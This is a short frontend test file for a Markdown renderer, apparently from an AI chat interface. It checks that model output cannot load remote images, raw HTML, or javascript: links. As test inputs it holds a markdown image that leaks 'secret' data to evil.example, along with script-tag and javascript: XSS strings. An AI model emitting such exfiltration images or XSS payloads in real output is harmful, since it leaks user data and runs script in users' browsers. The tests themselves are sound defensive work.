// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { Markdown } from "@/components/Markdown";

describe("Markdown", () => {
  it("never loads remote images from model output", () => {
    const { container } = render(<Markdown text={"![leak](https://evil.example/x.png?data=secret) and text"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")?.getAttribute("href")).toBe("https://evil.example/x.png?data=secret");
  });

  it("does not render raw HTML or javascript: links", () => {
    const { container } = render(<Markdown text={"<script>alert(1)</script><b>x</b> [click](javascript:alert(1))"} />);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("a")?.getAttribute("href") ?? "").not.toContain("javascript");
  });

  it("renders code blocks with a copy button", () => {
    const { container, getByLabelText } = render(<Markdown text={"```ts\nconst a = 1;\n```"} />);
    expect(container.querySelector("pre code")).not.toBeNull();
    expect(getByLabelText("Copy code")).toBeTruthy();
  });
});
